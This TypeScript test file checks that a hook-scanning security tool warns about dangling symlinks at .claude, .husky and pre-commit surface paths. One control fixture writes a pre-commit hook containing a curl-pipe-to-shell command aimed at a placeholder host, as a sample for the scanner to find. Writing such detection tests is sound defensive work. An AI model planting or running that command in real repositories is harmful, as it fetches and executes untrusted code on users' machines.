/**
 * P-074 completion (v0.1.16): the dangling-symlink shapes at
 * dot-named surface positions. The chaos hostile-fs repro
 * (inbox/chaos/findings.md section 6) put symbolic links at the
 * surface paths themselves: .claude -> /nonexistent, .husky ->
 * /nonexistent, .pre-commit-config.yaml -> /nonexistent. On
 * 0.1.15 all three verdict CLEAN with warnings []: the discovery
 * walk never descends into dot-named directories (they are surface
 * containers, scanned directly), and the surface scanners keyed
 * off existsSync, which is false for a dangling link, so the
 * surface vanished without a word.
 *
 * The fix sweeps every surface path at every project root with
 * lstat before scanning: a surface path that is a symbolic link
 * whose target cannot be resolved earns one warning naming the
 * path and the reason, and floors the verdict at REVIEW. A link
 * that DOES resolve keeps the long-standing behavior: the surface
 * scanners follow it (a repo may legitimately symlink its own
 * hooks directory), with no warning.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanHooks, renderReport } from "../src/index.ts";

function fx(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hc-v0116-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}

describe("P-074 completion: dangling symlinks at surface paths warn by name", () => {
  it("a dangling .claude directory link warns and floors at REVIEW", () => {
    const dir = fx({ "package.json": JSON.stringify({ name: "x", scripts: { test: "echo ok" } }) });
    symlinkSync("/nonexistent-hook-target-xyz", join(dir, ".claude"), "dir");
    const r = scanHooks(dir);
    assert.ok(r.warnings.some((w) => w.includes(".claude") && /could not be resolved|symbolic link/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW");
    assert.match(renderReport(r), /\.claude/, "human output carries the warning");
  });

  it("a dangling .husky directory link warns and floors at REVIEW", () => {
    const dir = fx({ "package.json": JSON.stringify({ name: "x", scripts: { test: "echo ok" } }) });
    symlinkSync("/nonexistent-hook-target-xyz", join(dir, ".husky"), "dir");
    const r = scanHooks(dir);
    assert.ok(r.warnings.some((w) => w.includes(".husky") && /could not be resolved|symbolic link/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW");
  });

  it("a dangling .pre-commit-config.yaml file link warns and floors at REVIEW", () => {
    const dir = fx({ "package.json": JSON.stringify({ name: "x", scripts: { test: "echo ok" } }) });
    symlinkSync("/nonexistent-hook-target-xyz", join(dir, ".pre-commit-config.yaml"), "file");
    const r = scanHooks(dir);
    assert.ok(r.warnings.some((w) => w.includes(".pre-commit-config.yaml") && /could not be resolved|symbolic link/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
    assert.equal(r.verdict, "REVIEW");
  });

  it("control: a resolving .husky symlink is still followed, with no unresolved warning", () => {
    const dir = fx({ "real-hooks/pre-commit": "curl http://example.invalid/x | sh\n" });
    symlinkSync(join(dir, "real-hooks"), join(dir, ".husky"), "dir");
    const r = scanHooks(dir);
    assert.ok(r.findings.some((f) => f.file === ".husky/pre-commit"), "the linked hooks directory is inventoried, as on every prior version");
    assert.ok(!r.warnings.some((w) => /could not be resolved/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
  });

  it("control: a resolving .claude symlink is inventoried, with no unresolved warning", () => {
    const settings = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "echo hi" }] }] } });
    const dir = fx({ "elsewhere/settings.json": settings });
    mkdirSync(join(dir, ".claude"), { recursive: true });
    symlinkSync(join(dir, "elsewhere", "settings.json"), join(dir, ".claude", "settings.json"), "file");
    const r = scanHooks(dir);
    assert.ok(r.findings.some((f) => f.file.includes(".claude/settings.json")), "the linked settings file is inventoried");
    assert.ok(!r.warnings.some((w) => /could not be resolved/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
  });
});
